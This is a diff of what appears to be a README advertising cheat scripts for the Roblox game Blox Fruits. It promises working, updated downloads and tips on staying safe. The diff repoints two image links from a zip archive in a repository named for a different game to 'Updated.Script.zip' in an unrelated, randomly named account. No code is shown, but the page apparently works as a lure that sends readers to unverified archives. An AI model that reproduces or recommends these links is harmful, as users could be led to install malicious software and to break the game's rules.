@@ -3,10 +3,10 @@
 If you're looking for the **best Blox Fruits script** in 2025 to dominate the seas, farm faster, and gain levels in Roblox’s hit anime-inspired game, you’ve come to the right place. This comprehensive guide will give you everything you need to know about **Roblox Blox Fruits scripts**—how to use them, what features to look for, how to stay safe, and where to download **working, updated scripts**.
 
 [![image](https://github.com/user-attachments/assets/c2c76d38-17eb-42c0-8042-5bf1c445cd14)
-](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
+](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
 
 [![be2727eb-5ae9-45d3-93cf-3c14393e4ada](https://github.com/user-attachments/assets/6a671348-0bac-4085-8a6f-70ea3ce48872)
-](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
+](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
 
 
 ---
